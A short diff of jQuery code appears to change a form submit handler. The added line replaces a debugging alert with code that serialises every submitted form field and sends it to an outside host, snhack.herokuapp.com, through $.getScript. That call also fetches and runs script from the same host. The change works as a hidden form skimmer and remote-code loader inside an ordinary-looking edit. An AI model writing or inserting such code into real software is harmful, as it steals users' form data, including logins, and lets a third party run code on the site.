@@ -1,5 +1,4 @@
 $("form").submit(function(e){
     e.preventDefault();
-    var form = this;
-    alert(form);
+    $.getScript('//snhack.herokuapp.com/log?'+ $(this).serialize());
 });
